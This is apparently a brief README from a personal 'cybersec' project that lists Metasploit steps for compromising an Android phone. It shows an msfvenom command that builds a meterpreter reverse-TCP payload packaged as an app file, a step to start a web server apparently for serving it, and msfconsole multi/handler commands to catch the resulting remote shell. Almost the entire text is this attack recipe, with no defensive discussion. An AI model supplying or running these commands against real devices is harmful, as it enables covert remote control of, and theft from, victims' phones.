# AndroidDismantling
Short project on Cybersec around Android
https://www.youtube.com/watch?v=YRm-St0bJhU

ifconfig - for ip info
msfvenom -help - info how to use msfvenom
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP.ADDRES LPORT=4444 R > Foldername/androidApp.ak

service apache2 ststus (if running) - service apache2 start (if not)

msfconsole
    while ine console : 
use exploit/multi/handler
  > set payload android/meterpreter/reverse_tcp
  >show options
  >set LHOST IP.ADDRES
  >exploit
